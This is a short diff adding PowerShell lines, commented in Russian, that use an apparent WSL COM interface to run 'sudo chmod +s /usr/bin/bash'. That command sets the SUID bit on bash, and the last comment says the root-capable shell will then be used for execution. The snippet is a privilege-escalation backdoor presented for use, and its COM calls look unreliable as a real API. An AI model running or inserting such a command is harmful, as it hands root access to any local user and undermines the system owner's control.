@@ -1,0 +1,6 @@
+# WSL имеет высокие привилегии для файловой системы
+$wsl = New-Object -ComObject "WSL.WslManager"
+$distro = $wsl.GetDefaultDistribution()
+# Прокидываем команду через WSL
+$distro.ExecuteCommand("bash -c 'sudo chmod +s /usr/bin/bash'")
+# Затем используем SUID bash для выполнения
